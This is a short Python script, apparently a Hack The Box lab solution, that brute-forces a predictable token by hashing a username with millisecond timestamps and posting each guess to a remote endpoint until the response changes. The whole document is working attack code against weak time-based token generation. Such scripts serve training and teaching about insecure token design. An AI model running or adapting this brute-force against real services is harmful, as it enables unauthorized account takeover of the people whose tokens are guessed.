from hashlib import md5
import requests
from sys import exit
from time import time
import datetime

url = "http://178.62.18.68:32473/question1/"






now = int(1686565720000)
start_time = now
fail_text = "Wrong token"
user="htbadmin"
endtime=now+1500

for x in range(start_time-1500, endtime):
    raw_data = user+str(x)
    md5_token = md5(str(raw_data).encode()).hexdigest()
    data ={"token":md5_token,"submit":"check"}

    print("checking {} {}".format(str(x), md5_token))

    res = requests.post(url, data=data)

    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()


exit()
